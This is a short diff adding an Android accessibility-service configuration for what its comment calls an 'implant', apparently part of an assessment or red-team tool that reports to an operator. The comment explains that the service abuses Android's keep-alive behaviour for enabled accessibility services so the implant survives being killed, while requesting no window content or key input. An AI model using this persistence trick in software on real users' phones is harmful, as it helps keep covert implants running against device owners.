@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- The configuration of the accessibility service of the implant.
+
+     The service is used for one thing: Android keeps an enabled
+     accessibility service alive, so the implant comes back when the system
+     kills the application.  It asks for no window content and no key
+     input, and the operator is told in the report that this technique is
+     visible to the user of the phone. -->
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault"
+    android:canRetrieveWindowContent="false"
+    android:description="@string/accessibility_description"
+    android:notificationTimeout="100" />
